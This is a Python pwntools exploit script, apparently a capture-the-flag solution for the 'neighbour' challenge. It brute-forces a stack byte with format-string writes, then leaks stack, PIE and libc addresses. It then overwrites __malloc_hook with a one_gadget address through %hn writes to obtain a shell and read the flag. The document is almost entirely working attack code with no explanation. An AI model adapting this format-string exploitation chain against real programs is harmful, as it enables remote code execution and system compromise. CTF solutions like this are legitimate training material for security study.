#!/usr/bin/python
from pwn import *
import sys
#sys.path.append('/home/lord_idiot/CTF-Tools/python-libs')

HOST = "neighbor.chal.ctf.westerns.tokyo"
PORT = 37565

def exploit(r):
	avoid = 0xd0
	r.recvuntil("Please tell me about yourself. I must talk about you to our mayor.\n")

	log.info("Time to wait ...")
	context.log_level = "DEBUG"
	letsgo = False
	for i in xrange(0x00, 0xff, 0x10):
		if i == 0:
			r.sendline("%7$hhn")
		else:
			r.sendline("%{}x%7$hhn".format(i))
		r.sendline("%144x%11$hhn")
		r.sendline("A%5$n")


###################################################################################################################
		r.sendline("asd") ########################################### AAAAAAAAAAAAAAAAAAAAAA ######################
###################################################################################################################

		if r.recvn(1, timeout=5) != "":
			letsgo = True
			break
	if not letsgo:
		log.info("Broken")
		r.close()
		return
	r.sendline("AAAA")
	if r.recvuntil("AAAA\n", timeout=30) == "":
		log.info("Broken")
		r.close()
		return
	log.info("Lets gooo")

	r.interactive()

	# leak stack ptr and pie base
	r.sendline("%7$p %10$p %14$p|")
	leaks = r.recvuntil("|", drop=True).rstrip().split(" ")
	stack_leak = int(leaks[0], 16)
	pie_base = int(leaks[1], 16) - 0x962
	libc_base = int(leaks[2], 16) - 0x203f1
	log.info("stack_leak : 0x{:x}".format(stack_leak))
	log.info("pie_base : 0x{:x}".format(pie_base))
	log.info("libc_base : 0x{:x}".format(libc_base))


	# write one_gadget | 0x45526 0x4557a 0xf1651 0xf24cb
	one_gadget = libc_base+0x4557a
	malloc_hook = libc_base+0x3c1af0
	addresses = [((malloc_hook>>8*2*i)&0xffff) for i in xrange(4)]
	addresses = zip(addresses, xrange(0,100,2))
	for address in addresses:
		fmt = "%{}c%7$hn".format(((stack_leak+0x30)&0xffff)+address[1])
		r.sendline(fmt)
		if address[0] < 1:
			fmt = "%11$hn"
		else:
			fmt = "%{}c%11$hn".format(address[0])
		r.sendline(fmt)

	addresses = [(((malloc_hook+2)>>8*2*i)&0xffff) for i in xrange(4)]
	addresses = zip(addresses, xrange(0,100,2))
	for address in addresses:
		fmt = "%{}c%7$hn".format(((stack_leak+0x38)&0xffff)+address[1])
		r.sendline(fmt)
		if address[0] < 1:
			fmt = "%11$hn"
		else:
			fmt = "%{}c%11$hn".format(address[0])
		r.sendline(fmt)

	addresses = [(((malloc_hook+4)>>8*2*i)&0xffff) for i in xrange(4)]
	addresses = zip(addresses, xrange(0,100,2))
	for address in addresses:
		fmt = "%{}c%7$hn".format(((stack_leak+0x40)&0xffff)+address[1])
		r.sendline(fmt)
		if address[0] < 1:
			fmt = "%11$hn"
		else:
			fmt = "%{}c%11$hn".format(address[0])
		r.sendline(fmt)

	addresses = [((one_gadget>>8*2*i)&0xffff) for i in xrange(3)]
	addresses = zip(addresses, xrange(0,100,2))
	addresses = sorted(addresses)
	fmt = ""
	total = 0
	for address in addresses:
		fmt += "%{}c".format(address[0]-total)
		fmt += "%{}$hn".format(17+address[1]/2)
		total = address[0]
	r.sendline(fmt)

	# WIN
	r.sendline("%70555x")
	r.sendline("cat flag")

	r.interactive()
	return

if __name__ == "__main__":
	elf_name = "./neighbour"
	e = ELF(elf_name)
	
	libc_name = "./libc.so.6"
	#libc = ELF(libc_name)

	if sys.argv[-1] == "remote":
		r = remote(HOST, PORT)
		exploit(r)
	else:
		if libc_name != "":
			r = process(elf_name, env={"LD_PRELOAD" : libc_name, "asdasd":"asdasd"}, stderr=open('/dev/null', 'w+'))
		else:
			r = process(elf_name)
		print util.proc.pidof(r)

		if sys.argv[-1] == "debug":
			pause()
		exploit(r)
